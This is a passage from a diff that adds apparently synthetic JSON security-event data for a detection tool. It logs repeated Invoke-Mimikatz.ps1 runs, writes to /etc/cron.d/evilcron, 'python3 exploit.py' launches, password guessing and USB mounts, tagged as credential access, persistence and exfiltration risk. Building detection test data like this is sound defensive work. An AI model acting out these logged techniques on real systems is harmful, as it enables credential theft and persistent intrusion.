+    "event_id": "evt-100094"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749485101.057917,
+    "event_id": "evt-100095"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749429662.057921,
+    "event_id": "evt-100096"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749478747.057924,
+    "event_id": "evt-100097"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749482239.05793,
+    "event_id": "evt-100098"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749475246.057934,
+    "event_id": "evt-100099"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749511887.057936,
+    "event_id": "evt-100100"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749436524.057938,
+    "event_id": "evt-100101"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749419841.057941,
+    "event_id": "evt-100102"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749440373.057943,
+    "event_id": "evt-100103"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749455395.057946,
+    "event_id": "evt-100104"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749434462.057948,
+    "event_id": "evt-100105"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749434653.05795,
+    "event_id": "evt-100106"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749502687.057953,
+    "event_id": "evt-100107"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749502522.057957,
+    "event_id": "evt-100108"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749474266.057961,
+    "event_id": "evt-100109"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749462876.057964,
+    "event_id": "evt-100110"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749445035.057968,
+    "event_id": "evt-100111"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749477507.057972,
+    "event_id": "evt-100112"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749500307.057977,
+    "event_id": "evt-100113"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749510594.05798,
+    "event_id": "evt-100114"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749421109.057984,
+    "event_id": "evt-100115"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749419980.057988,
+    "event_id": "evt-100116"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749477764.057991,
+    "event_id": "evt-100117"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749446911.057994,
+    "event_id": "evt-100118"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749507076.057998,
+    "event_id": "evt-100119"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749448939.058002,
+    "event_id": "evt-100120"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749429649.058007,
+    "event_id": "evt-100121"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749512139.05801,
+    "event_id": "evt-100122"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749489212.058015,
+    "event_id": "evt-100123"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749489624.058018,
+    "event_id": "evt-100124"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749431846.05802,
+    "event_id": "evt-100125"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749502039.058022,
+    "event_id": "evt-100126"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749425938.058024,
+    "event_id": "evt-100127"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749516601.058027,
+    "event_id": "evt-100128"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749463771.058029,
+    "event_id": "evt-100129"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749456960.058032,
+    "event_id": "evt-100130"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749478963.058035,
+    "event_id": "evt-100131"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749511203.058037,
+    "event_id": "evt-100132"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749487650.058039,
+    "event_id": "evt-100133"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749424584.058041,
+    "event_id": "evt-100134"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749478168.058043,
+    "event_id": "evt-100135"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749475909.058045,
+    "event_id": "evt-100136"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749489341.058048,
+    "event_id": "evt-100137"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749483121.05805,
+    "event_id": "evt-100138"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749460233.058062,
+    "event_id": "evt-100139"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749517744.058064,
+    "event_id": "evt-100140"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749502615.058067,
+    "event_id": "evt-100141"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749505959.058071,
+    "event_id": "evt-100142"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749490189.058075,
+    "event_id": "evt-100143"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749466552.058078,
+    "event_id": "evt-100144"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749511000.058082,
+    "event_id": "evt-100145"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749490922.058086,
+    "event_id": "evt-100146"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749507891.05809,
+    "event_id": "evt-100147"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749442362.058093,
+    "event_id": "evt-100148"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749485665.058097,
+    "event_id": "evt-100149"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749427616.058099,
+    "event_id": "evt-100150"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749441797.058101,
+    "event_id": "evt-100151"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749491834.058103,
+    "event_id": "evt-100152"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749465076.058105,
+    "event_id": "evt-100153"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749437123.058107,
+    "event_id": "evt-100154"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749454454.05811,
+    "event_id": "evt-100155"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749434426.058112,
+    "event_id": "evt-100156"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749503365.058114,
+    "event_id": "evt-100157"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749489217.058117,
+    "event_id": "evt-100158"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749448423.05812,
+    "event_id": "evt-100159"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749508764.058124,
+    "event_id": "evt-100160"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749499352.058128,
+    "event_id": "evt-100161"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749466347.058134,
+    "event_id": "evt-100162"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749493832.058137,
+    "event_id": "evt-100163"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749479971.058141,
+    "event_id": "evt-100164"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749457863.058145,
+    "event_id": "evt-100165"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749445891.058149,
+    "event_id": "evt-100166"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749485296.058154,
+    "event_id": "evt-100167"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749513340.058157,
+    "event_id": "evt-100168"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749473288.058159,
+    "event_id": "evt-100169"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749480176.058161,
+    "event_id": "evt-100170"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749503827.058163,
+    "event_id": "evt-100171"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749433531.058165,
+    "event_id": "evt-100172"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749512214.058169,
+    "event_id": "evt-100173"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749482152.058171,
+    "event_id": "evt-100174"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749511647.058173,
+    "event_id": "evt-100175"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749493696.058177,
+    "event_id": "evt-100176"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749422768.058179,
+    "event_id": "evt-100177"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749430682.058181,
+    "event_id": "evt-100178"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749431109.058183,
+    "event_id": "evt-100179"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749501353.058185,
+    "event_id": "evt-100180"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749496653.058188,
+    "event_id": "evt-100181"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749424634.05819,
+    "event_id": "evt-100182"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749482950.058192,
+    "event_id": "evt-100183"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749479194.058194,
+    "event_id": "evt-100184"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749462029.058197,
+    "event_id": "evt-100185"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749454235.058199,
+    "event_id": "evt-100186"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749506936.058202,
+    "event_id": "evt-100187"
+  },
+  {
+    "event_type": "script_execution",
+    "script": "Invoke-Mimikatz.ps1",
+    "user": "domain_user",
+    "host": "macbook.local",
+    "risk_score": 95,
+    "tags": [
+      "credential_access",
+      "powershell_abuse",
+      "evasion"
+    ],
+    "timestamp": 1749452892.058204,
+    "event_id": "evt-100188"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
